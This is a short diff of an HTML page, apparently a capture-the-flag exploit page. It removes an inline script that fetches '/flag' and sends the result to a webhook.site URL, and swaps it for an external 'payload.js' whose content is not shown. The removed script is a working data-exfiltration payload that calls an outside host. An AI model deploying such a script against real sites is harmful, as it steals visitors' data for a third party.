@@ -1,15 +1,6 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>mirror</title>
-</head>
+<html>
 <body>
-<script>
-(async () => {
-  const flag = await (await fetch('/flag')).text();
-  location.href = 'https://webhook.site/d6fcb08a-5fb3-4e51-b3c3-09e06007096c?flag=' + encodeURIComponent(flag);
-})();
-</script>
+<script src="payload.js"></script>
 </body>
 </html>
